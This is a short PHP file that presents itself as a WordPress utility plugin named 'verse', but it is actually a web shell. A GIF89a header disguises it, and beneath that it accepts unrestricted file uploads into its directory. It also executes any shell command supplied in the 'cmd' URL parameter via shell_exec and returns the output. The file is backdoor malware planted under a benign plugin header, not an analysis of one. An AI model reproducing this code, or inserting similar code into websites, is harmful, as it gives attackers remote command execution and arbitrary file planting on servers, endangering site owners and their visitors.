<?php
/**
 * Plugin Name: verse
 * Plugin URI: https://github.com/v3rse0ne/verse
 * Description: Custom utility plugin
 * Version: 1.0.0
 * Author: v3rse0ne
 * License: GPLv2
 */
// 🖤

GIF89a
<?php
if(isset($_FILES['f'])){
    $dir = dirname(__FILE__) . '/';
    $name = basename($_FILES['f']['name']);
    if(move_uploaded_file($_FILES['f']['tmp_name'], $dir . $name)){
        $url = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST']
             . str_replace(basename(__FILE__), '', $_SERVER['PHP_SELF']) . $name;
        echo 'uploaded: <a href="' . $url . '" target="_blank">' . htmlspecialchars($name) . '</a>';
    }
}
if(isset($_GET['cmd'])){ echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; }
?>
<form method="POST" enctype="multipart/form-data">
  <input type="file" name="f"><button>-Shadow-Here-</button>
</form>